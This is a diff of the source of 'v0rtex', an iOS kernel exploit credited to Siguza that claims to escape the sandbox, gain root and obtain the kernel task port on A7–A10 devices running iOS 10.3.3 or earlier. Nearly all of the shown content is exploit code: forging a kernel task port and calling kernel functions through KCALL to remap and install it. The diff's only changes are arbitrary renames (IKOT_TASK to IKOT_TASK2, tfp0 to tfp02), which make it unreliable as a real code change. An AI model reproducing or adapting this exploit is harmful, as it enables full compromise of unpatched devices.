@@ -3,7 +3,7 @@
 // Exploit by Siguza.
 
 // Status quo:
-// - Escapes sandbox, gets root and tfp0, should work on A7-A10 devices <=10.3.3.
+// - Escapes sandbox, gets root and tfp02, should work on A7-A10 devices <=10.3.3.
 // - Can call arbitrary kernel functions with up to 7 args via KCALL().
 // - Relies on mach_zone_force_gc which was removed in iOS 11, but the same
 //   effect should be achievable by continuously spraying through zones and
@@ -44,7 +44,7 @@ const uint64_t IOSURFACE_SET_VALUE      =  9;
 const uint64_t IOSURFACE_GET_VALUE      = 10;
 const uint64_t IOSURFACE_DELETE_VALUE   = 11;
 
-const uint32_t IKOT_TASK                = 2;
+const uint32_t IKOT_TASK2                = 2;
 
 enum
 {
@@ -431,7 +431,7 @@ typedef union
     } b;
 } ktask_t;
 
-kern_return_t v0rtex(task_t *tfp0, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc)
+kern_return_t v0rtex(task_t *tfp02, kptr_t *kslide, kptr_t *kernucred, kptr_t *selfproc)
 {
     kern_return_t retval = KERN_FAILURE,
     ret;
@@ -916,7 +916,7 @@ goto out3; \
     ktask.b.itk_self = 1;
     *faketask_buf = ktask;
     
-    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK
+    kport.ip_bits = 0x80000002; // IO_BITS_ACTIVE | IOT_PORT | IKOT_TASK2
     kport.ip_kobject = fake_addr + faketask_off;
     
     kport.ip_requests = 0;
@@ -1147,8 +1147,8 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     LOG("zm_port addr: " ADDR, ptrs[0]);
     LOG("km_port addr: " ADDR, ptrs[1]);
     
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK, 0, 0, 0, 0);
-    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), ptrs[0], zm_task_addr, IKOT_TASK2, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), ptrs[1], km_task_addr, IKOT_TASK2, 0, 0, 0, 0);
     
     r = KCALL(OFF(COPYIN), ptrs, self_task + OFFSET_TASK_ITK_REGISTERED, sizeof(ptrs), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
@@ -1196,7 +1196,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
     
     kptr_t newport = ZM_FIX_ADDR(KCALL(OFF(IPC_PORT_ALLOC_SPECIAL), ipc_space_kernel, 0, 0, 0, 0, 0, 0));
     LOG("newport: " ADDR, newport);
-    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK, 0, 0, 0, 0);
+    KCALL(OFF(IPC_KOBJECT_SET), newport, remap_addr, IKOT_TASK2, 0, 0, 0, 0);
     KCALL(OFF(IPC_PORT_MAKE_SEND), newport, 0, 0, 0, 0, 0, 0);
     r = KCALL(OFF(COPYIN), &newport, OFF(REALHOST) + OFFSET_REALHOST_SPECIAL + sizeof(kptr_t) * 4, sizeof(kptr_t), 0, 0, 0, 0);
     LOG("copyin: %s", errstr(r));
@@ -1213,7 +1213,7 @@ zm_tmp < zm_hdr.start ? zm_tmp + 0x100000000 : zm_tmp \
         goto out5;
     }
     
-    *tfp0 = kernel_task;
+    *tfp02 = kernel_task;
     *kslide = slide;
     *kernucred = kern_ucred;
     *selfproc = self_proc;
